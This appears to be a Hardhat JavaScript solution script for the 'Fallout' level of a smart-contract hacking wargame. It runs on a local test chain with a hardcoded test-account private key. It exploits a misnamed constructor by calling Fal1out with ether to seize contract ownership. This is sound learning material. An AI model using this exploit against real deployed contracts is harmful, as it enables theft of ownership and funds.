const hre = require("hardhat");

async function main() {

    const provider = new ethers.providers.JsonRpcProvider(
		"http://127.0.0.1:8545/"
	);

	// These are Harhdat's deterministic accounts
	// NEVER SEND REAL FUNDS TO THESE ACCOUNTS!
    //0x1eAfC025a56ecA9d0880eE92Ad32944B10F1E3E8 -> player address
	const wallet = new ethers.Wallet(
		"0xac1d2de5bb160f57820767f82868f942f74b39a2388bcbf3221a7789201d600c",
		provider
	);  

  // Assuming you have a contract already deployed
  const contractAddress = "0xd5AFF138fbba821402c4150AC82e4DE73bB34a45";
  const contractjson = require("../artifacts/contracts/Fallout.sol/Fallout.json");
  const abi = contractjson.abi;
  
  const contract = new ethers.Contract(contractAddress, abi, wallet);

  console.log("Player : ",wallet.address);

  
  
  console.log("*** Run this transaction to start exploit ***");
  let amountInWei = ethers.utils.parseEther("0.0001");
  const txResponse = await contract.Fal1out({
        value: amountInWei
    });

    console.log('Transaction hash:', txResponse.hash);

    await txResponse.wait();
    console.log('Transaction confirmed');

 
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
